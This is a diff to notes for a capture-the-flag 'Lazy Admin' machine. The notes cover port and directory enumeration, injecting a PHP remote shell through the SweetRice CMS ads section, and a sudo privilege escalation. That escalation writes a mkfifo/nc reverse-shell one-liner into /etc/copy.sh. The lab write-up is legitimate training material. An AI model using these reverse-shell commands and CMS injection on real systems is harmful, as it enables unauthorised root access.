@@ -1,16 +1,21 @@
 Lazy Admin Machine:
     1-Enumeration:
 
-        nmap -Pn -v -p- <IP> -oN enu/nmap-ports.logs
+        nmap -Pn -v -p- <IP> -oN enum/nmap-ports.logs
 
             IF port == 80:
                 gobuster dir -u http://<IP> -r -w /usr/share/wordlists/dirb/common.txt | tee enum/gobuster-p80.log
-                grep -v | 403 enu/gobuster-p80.log 
+
+                or
+
+                python3 dirsearch.py -u http://<IP> -e php, http, xml, js -x 400,401,403
+
+
                 nikto -h http://<IP> | tee enum/nikto-Web80.log
 
         ------------------------------------------------------
 
-        namp -Pn -v -sVC --top-ports 50 --open <IP> -oN enum/nmap-top50.logs
+        nmap -Pn -v -sVC --top-ports 50 --open <IP> -oN enum/nmap-top50.logs
 
             Document Ports/Services Versions
 
@@ -61,3 +66,30 @@ Lazy Admin Machine:
 
     2- Exploit Manager Dashboard:
         we go to the Ads section of SweetRice Cms and insert a malicious php code for a remote shell
+        We inject the remote shell and we open a Listener on our machine:
+            nc -lvnp 443 <-- 443 Allowed by Fw
+
+        Now we have a remote shell but in limitied access www-data 
+
+        2-B We will enumerate:
+
+            cat backup.pl
+            #!/usr/bin/perl
+
+            system("sh", "/etc/copy.sh");
+
+            /var/backups
+
+
+            sudo -l
+            cat /etc/copy.sh
+            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+
+        2-C Exploit:
+
+            The Enumeration showed us  atemporary file that let us Override to get a root shell:
+
+                echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Kali IP> 443 >/tmp/f" > /etc/copy.sh
+
+                sudo /usr/bin/perl /home/itguy/backup.pl
